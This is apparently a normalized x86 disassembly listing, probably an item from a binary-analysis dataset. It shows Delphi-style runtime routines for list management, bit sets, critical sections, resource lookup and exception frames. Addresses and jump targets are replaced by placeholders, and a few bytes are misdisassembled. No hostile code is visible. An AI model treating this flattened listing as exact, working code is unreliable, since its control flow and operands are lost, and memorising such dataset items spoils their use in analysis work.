mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_41a4ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad7d
mov eax [ rw-data ]
call sub_41a8a0
retn
sub_41addc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ae14
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41addc
mov edx eax
mov eax [ rw-data ]
call sub_41b990
pop edi
pop esi
pop ebx
retn
sub_41ae40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41ba18
mov esi eax
xor edx edx
push ebp
push sub_41aeaa
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
mov edx ebx
mov eax esi
call sub_41b654
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403c08
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41aebc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41ba18
mov esi eax
xor edx edx
push ebp
push sub_41af26
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
mov edx ebx
mov eax esi
call sub_41b654
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403c08
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41af38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408224
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41af78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_404174
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41afbc
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41b6b0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41b4f8
sub_41b014
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41b654
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41b054
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_41b014
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_41b078
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4045e0
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e434
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b0ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41df34
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_41b0fc
push ebx
call sub_40629c
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_40629c
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41b4f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov ebx eax
call sub_40629c
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov ebx eax
call sub_40629c
mov [ eax + 0xc ] ebx
sub_41b154
push ebx
push esi
push edi
call sub_40629c
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41b654
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_41b184
push ebx
push esi
call sub_40629c
mov eax [ eax + 0x8 ]
call sub_403390
call sub_40629c
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_41b73c
mov esi eax
call sub_40629c
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41b544
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_40629c
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403390
sub_41b1e0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41b276
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b27d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40331c
call sub_41b1e0
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4032e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404384
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405530
call sub_405580
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_41b078
or bl al
sub_41b288
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41b336
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41b317
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4032d8
call sub_41b1e0
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41b0fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b31e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41b154
retn
call sub_41b184
sub_41b34c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e608
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_41b3a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42178c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3b0
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_41b3b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4032d8
push eax
mov eax esi
call sub_4032d8
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_41c3c4
push eax
mov eax esi
call sub_41c3c4
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b4c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41b34c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b4a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41b34c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4081b0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4af
mov eax [ ebp - 0xc ]
call sub_403390
retn
mov al 0x1
sub_41b4d8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41b4f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41b544
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4029b0
mov edx esi
mov eax ebx
call sub_41b654
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41b5a8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41b5a4
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
jmp sub_403b5c
sub_41b5e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41b628
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_406030
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41b5a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b62f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_41b654
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_41b67c
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41b810
retn
sub_41b6b0
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41b6d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4029b0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41b748
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_41b654
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_41b544
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41b6d0
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_41b7a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41b7f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41b6b0
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41b544
sub_41b810
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4027f4
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41b84c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41b5e0
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41b810
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402da4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41b544
dec ebp
inc edi
jne r-xdata
sub_41b8c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41b914
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40375c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba18
xor eax eax
push ebp
push sub_41b976
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403390
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b97d
mov eax [ ebp - 0x4 ]
call sub_41ba7c
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41b990
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba18
xor eax eax
push ebp
push sub_41ba0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41b4f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41b6b0
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba13
mov eax [ ebp - 0x4 ]
call sub_41ba7c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41b5e0
sub_41ba2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba18
xor eax eax
push ebp
push sub_41ba6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41b7f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba76
mov eax [ ebp - 0x4 ]
call sub_41ba7c
retn
sub_41ba88
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41badc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41badc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41bab8
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4027b4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402da4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4027d4
mov edx edi
mov eax ebp
call sub_41bad0
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4029b0
sub_41bb80
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41bab8
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41badc
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_41bbac
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_41bc24
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_41ec24
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41bc64
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bd1a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b8
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4032e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404384
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4032e0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd21
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_41bd40
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bdd5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4032e0
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404384
mov eax ebx
mov si 0xffff
call sub_40358c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bddc
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
mov si 0xffff
call sub_40358c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40358c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4044a0
sub_41bde7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4035e4
mov eax ebx
mov si 0xffff
call sub_40358c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40358c
push eax
lea eax [ ebx + 0x4 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
pop eax
call sub_403444
sub_41be44
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41be64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41be84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41beac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405b50
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_40358c
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax edi
call sub_405b50
mov edx eax
mov eax esi
call sub_41beac
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405b50
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_41bf44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41bf99
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405b50
mov edx eax
mov eax edi
call sub_41beac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfa0
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41bfa8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41bfe0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
